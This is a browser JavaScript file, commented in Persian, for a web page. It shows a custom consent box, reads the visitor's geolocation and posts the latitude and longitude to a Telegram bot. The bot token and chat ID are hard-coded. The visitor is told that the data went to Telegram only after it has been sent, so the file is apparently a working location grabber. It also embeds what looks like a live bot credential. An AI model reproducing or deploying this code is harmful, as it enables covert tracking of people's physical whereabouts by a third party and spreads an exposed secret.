// ⚠️ مقادیر شما به طور مستقیم در کد قرار داده شده‌اند.
// اگر شناسه چت شما یک گروه یا کانال است، باید با علامت منفی (-) شروع شود.
const TELEGRAM_BOT_TOKEN = '8263826016:AAGm08wxKoam6IdZd-tWSErXQkAEQaE2mlc';
const TELEGRAM_CHAT_ID = '7851461640'; 

// دریافت المان‌های HTML
const confirmationMessage = document.getElementById('confirmationMessage');
const mainContent = document.getElementById('mainContent');
const contentStatus = document.getElementById('contentStatus');
const yesButton = document.getElementById('yesButton');
const noButton = document.getElementById('noButton');

// توابع کمکی برای مدیریت نمایش UI
function hideConsentBox() {
    confirmationMessage.classList.add('hidden');
}

function showMainContent(message) {
    contentStatus.textContent = message;
}

// تابع جدید: ارسال داده به تلگرام
function sendLocationToTelegram(lat, lon) {
    // ایجاد متن پیام به زبان فارسی
    const messageText = `📍 موقعیت جدید از وب‌سایت:\nعرض جغرافیایی: ${lat}\nطول جغرافیایی: ${lon}\nدریافت شده در: ${new Date().toLocaleString('fa-IR')}`;
    
    // ساخت URL API تلگرام برای متد sendMessage
    const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    // ارسال درخواست POST به API تلگرام
    fetch(apiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: messageText
            // نیازی به parse_mode خاصی نیست، چون متن ساده است.
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('موقعیت با موفقیت به تلگرام ارسال شد.');
            alert('موقعیت مکانی شما با موفقیت به تلگرام ارسال شد!');
        } else {
            console.error('خطا در ارسال به تلگرام:', data);
            alert(`خطا در ارسال به تلگرام: ${data.description || 'خطای نامشخص'}`);
        }
    })
    .catch(error => {
        console.error('خطای شبکه:', error);
        alert('خطای شبکه در اتصال به تلگرام.');
    });
}

// تابع اصلی برای درخواست دسترسی به موقعیت مکانی
function requestLocation() {
    // نمایش اعلان رسمی مرورگر برای دسترسی به Geolocation
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            // تابع موفقیت (اگر کاربر در اعلان مرورگر "Allow" را بزند)
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                
                hideConsentBox();
                showMainContent(`✅ دسترسی مجاز شد. موقعیت شما: عرض جغرافیایی ${lat}، طول جغرافیایی ${lon}`);
                
                // 🚀 ارسال داده‌ها به تلگرام
                sendLocationToTelegram(lat, lon);
            },
            // تابع خطا (اگر کاربر در اعلان مرورگر "Block" را بزند یا خطایی رخ دهد)
            (error) => {
                hideConsentBox();
                if (error.code === error.PERMISSION_DENIED) {
                    showMainContent("❌ دسترسی توسط مرورگر رد شد. برای تغییر، باید تنظیمات کروم را به‌صورت دستی عوض کنید.");
                } else {
                    showMainContent(`❌ خطایی رخ داد: ${error.message}`);
                }
            }
        );
    } else {
        hideConsentBox();
        showMainContent("مرورگر شما از Geolocation API پشتیبانی نمی‌کند.");
    }
}

// --- مدیریت رویداد کلیک دکمه‌ها ---

yesButton.addEventListener('click', () => {
    // با کلیک روی دکمه بله سفارشی، درخواست دسترسی رسمی مرورگر آغاز می‌شود.
    showMainContent("در حال درخواست دسترسی از مرورگر... لطفاً اعلان بالای صفحه را تایید کنید.");
    requestLocation();
});

noButton.addEventListener('click', () => {
    // با کلیک روی خیر، پیام سفارشی پنهان می‌شود و سایت بدون موقعیت ادامه می‌دهد.
    hideConsentBox();
    showMainContent("شما دسترسی را رد کردید. قابلیت‌های مبتنی بر موقعیت فعال نخواهند شد.");
});
